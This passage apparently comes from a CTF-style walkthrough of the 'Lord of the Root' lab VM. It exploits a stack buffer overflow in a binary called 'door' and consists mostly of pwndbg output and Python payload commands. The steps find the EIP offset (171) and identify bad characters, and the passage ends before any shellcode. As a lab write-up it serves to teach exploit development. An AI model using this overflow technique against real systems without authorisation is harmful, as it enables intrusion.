    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>00:0000â”‚ espÂ Â 0xffffcf60 â—‚â€” 'f8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>01:0004â”‚Â Â Â Â Â Â 0xffffcf64 â—‚â€” '9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>02:0008â”‚Â Â Â Â Â Â 0xffffcf68 â—‚â€” 'Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>03:000câ”‚Â Â Â Â Â Â 0xffffcf6c â—‚â€” 'g2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>04:0010â”‚Â Â Â Â Â Â 0xffffcf70 â—‚â€” '3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>05:0014â”‚Â Â Â Â Â Â 0xffffcf74 â—‚â€” 'Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>06:0018â”‚Â Â Â Â Â Â 0xffffcf78 â—‚â€” 'g6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>07:001câ”‚Â Â Â Â Â Â 0xffffcf7c â—‚â€” '7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> â–º Â f 0 41376641</div>
    <div>Â Â Â f 1 66413866</div>
    <div>Â Â Â f 2 30674139</div>
    <div>Â Â Â f 3 41316741</div>
    <div>Â Â Â f 4 67413267</div>
    <div>Â Â Â f 5 34674133</div>
    <div>Â Â Â f 6 41356741</div>
    <div>Â Â Â f 7 67413667</div>
    <div>Â Â Â f 8 38674137</div>
    <div>Â Â Â f 9 41396741</div>
    <div>Â Â Â f 10 68413068</div>
    <div>Program received signal SIGSEGV (fault address 0x41376641)</div>
</div>
<div><br /></div>
<div>Looks like our eip was overwritten with the pattern 'Af7a' (0x41376641). We can run pattern_offset.rbÂ to see where exactly that string was in our pattern.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41376641</div>
    <div>[*] Exact match at offset 171</div>
</div>
<div><br /></div>
<div>Great! Now we can verify this by sending 171 'A's, 4 'B's and 200 'C's. The 'B's should end up squarely in our eip. We are sending the 'C's just to see how much space we might have to put our exploit in esp (depending on what calls/jmps are available... we'll see later).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; run `python -c 'print "A"*171 + "B"*4 + "C"*200'`Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>Starting program: /root/Walkthroughs/lordoftheroot/door `python -c 'print "A"*171 + "B"*4 + "C"*200'`</div>
    <div>
        <div><br /></div>
    </div>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0x42424242 in ?? ()</div>
    <div>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> EAXÂ Â 0x0</div>
    <div> EBXÂ Â 0x0</div>
    <div> ECXÂ Â 0xffffd240 â—‚â€” 0x434343 /* 'CCC' */</div>
    <div> EDXÂ Â 0xffffcf85 â—‚â€” 0x434343 /* 'CCC' */</div>
    <div> EDIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> ESIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> EBPÂ Â 0x41414141 ('AAAA')</div>
    <div> ESPÂ Â 0xffffcec0 â—‚â€” 0x43434343 ('CCCC')</div>
    <div> EIPÂ Â 0x42424242 ('BBBB')</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>Invalid address 0x42424242</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>00:0000â”‚ espÂ Â 0xffffcec0 â—‚â€” 0x43434343 ('CCCC')</div>
    <div>... â†“</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> â–º Â f 0 42424242</div>
    <div>Â Â Â f 1 43434343</div>
    <div>Â Â Â f 2 43434343</div>
    <div>Â Â Â f 3 43434343</div>
    <div>Â Â Â f 4 43434343</div>
    <div>Â Â Â f 5 43434343</div>
    <div>Â Â Â f 6 43434343</div>
    <div>Â Â Â f 7 43434343</div>
    <div>Â Â Â f 8 43434343</div>
    <div>Â Â Â f 9 43434343</div>
    <div>Â Â Â f 10 43434343</div>
    <div>Program received signal SIGSEGV (fault address 0x42424242)</div>
</div>
<div><br /></div>
<div>Perfect. We see our 4 'B's are perfectly placed in eip, and we see all 200 of our 'C's have started to fill the stack.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; x/100x 0xffffce00</div>
    <div>0xffffce00:Â Â Â Â Â 0xffffce11Â Â Â Â Â Â 0xffffd0ccÂ Â Â Â Â Â 0x080481fcÂ Â Â Â Â Â 0xffffce7c</div>
    <div>0xffffce10:Â Â Â Â Â 0x414141b0Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce20:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce30:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce40:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce50:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce60:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce70:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce80:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffce90:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffcea0:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffceb0:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x42424242</div>
    <div>0xffffcec0:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffced0:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcee0:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcef0:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf00:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf10:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf20:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf30:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf40:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf50:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf60:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf70:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffcf80:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0xffffd800Â Â Â Â Â Â 0xffffd83a</div>
</div>
<div><br /></div>
<div>Unfortunately, we also notice that eax does NOT contain our 'A's. Since we wont' be able to control eax, we'll have to hope there is a jmp/call to esp. Fingers crossed.</div>
<div><br /></div>
<div>Before generating our exploit code, we need to check for bad characters. We'll do this by passing in a string of hex characters (\x01-\xff) and seeing which ones don't make it. We aren't even going to send \x00 (the null character) because we know this won't work.</div>
<div><br /></div>
<div>We'll send our string of potentially bad characters in place of the 'C's from before.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; run `python -c 'print "A"*171 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\</div>
    <div>x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3</div>
    <div>f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\</div>
    <div>x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8</div>
    <div>a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\</div>
    <div>xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd</div>
    <div>5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\</div>
    <div>xfb\xfc\xfd\xfe\xff"'`</div>
    <div>Starting program: /root/Walkthroughs/lordoftheroot/door `python -c 'print "A"*171 + "B"*4 + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\</div>
    <div>x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x3</div>
    <div>4\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\</div>
    <div>x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7</div>
    <div>f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\</div>
    <div>xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xc</div>
    <div>a\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\</div>
    <div>xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"'`</div>
    <div>
        <div><br /></div>
    </div>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0x42424242 in ?? ()</div>
    <div>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> EAXÂ Â 0x0</div>
    <div> EBXÂ Â 0x0</div>
    <div> ECXÂ Â 0xffffd140 â—‚â€” 0x42424241 ('ABBB')</div>
    <div> EDXÂ Â 0xffffce8b â—‚â€” 0x42424241 ('ABBB')</div>
    <div> EDIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> ESIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> EBPÂ Â 0x41414141 ('AAAA')</div>
    <div> ESPÂ Â 0xffffce90 â—‚â€” 0x4030201</div>
    <div> EIPÂ Â 0x42424242 ('BBBB')</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>Invalid address 0x42424242</div>
    <div>
        <div><br /></div>
    </div>
    <div>
        <div><br /></div>
    </div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>00:0000â”‚ espÂ Â 0xffffce90 â—‚â€” 0x4030201</div>
    <div>01:0004â”‚Â Â Â Â Â Â 0xffffce94 â—‚â€” 0x8070605</div>
    <div>02:0008â”‚Â Â Â Â Â Â 0xffffce98 â€”â–¸ 0xffffcf00 â€”â–¸ 0x804845d (main) â—‚â€” pushÂ Â Â ebp</div>
    <div>03:000câ”‚Â Â Â Â Â Â 0xffffce9c â€”â–¸ 0xffffceb4 â—‚â€” 0x0</div>
    <div>04:0010â”‚Â Â Â Â Â Â 0xffffcea0 â—‚â€” 0x1</div>
    <div>05:0014â”‚Â Â Â Â Â Â 0xffffcea4 â—‚â€” 0x0</div>
    <div>06:0018â”‚Â Â Â Â Â Â 0xffffcea8 â€”â–¸ 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div>07:001câ”‚Â Â Â Â Â Â 0xffffceac â—‚â€” 0xffffffff</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> â–º Â f 0 42424242</div>
    <div>Â Â Â f 1Â Â 4030201</div>
    <div>Â Â Â f 2Â Â 8070605</div>
    <div>Program received signal SIGSEGV (fault address 0x42424242)</div>
</div>
<div><br /></div>
<div>We can see eip still has or 'B's. Let's check the memory for our bad characters.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; x/8x 0xffffd141</div>
    <div>0xffffd141:Â Â Â Â Â 0x42424242Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x04030201</font>Â Â Â Â Â Â 0x08070605Â Â Â Â Â Â 0x<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0d0c0b</font><font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">00</font>
    </div>
    <div>0xffffd151:Â Â Â Â Â 0x11100f0eÂ Â Â Â Â Â 0x15141312Â Â Â Â Â Â 0x19181716Â Â Â Â Â Â 0x1d1c1b1a</div>
</div>
<div><br /></div>
<div>We can see \x09 and \x0a both didn't make it. We'll remove those and try again.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; x/8x 0xffffce90</div>
    <div>0xffffce90:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x04030201</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x08070605</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x0e0d0c0b</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x1211100f</font>
    </div>
    <div>0xffffcea0:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x16151413</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x1a191817</font>Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x1e1d1c1b</font>Â Â Â Â Â Â 0xffff<font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">00</font><font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">1f</font>
    </div>
</div>
<div><br /></div>
<div>Looks like we hit another snag at \x20. We'll remove that one and try again.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; x/100x 0xffffce90</div>
    <div>0xffffce90:Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x04030201</font>Â Â Â Â Â Â 0x08070605Â Â Â Â Â Â 0x0e0d0c0bÂ Â Â Â Â Â 0x1211100f</div>
    <div>0xffffcea0:Â Â Â Â Â 0x16151413Â Â Â Â Â Â 0x1a191817Â Â Â Â Â Â 0x1e1d1c1bÂ Â Â Â Â Â 0x2322211f</div>
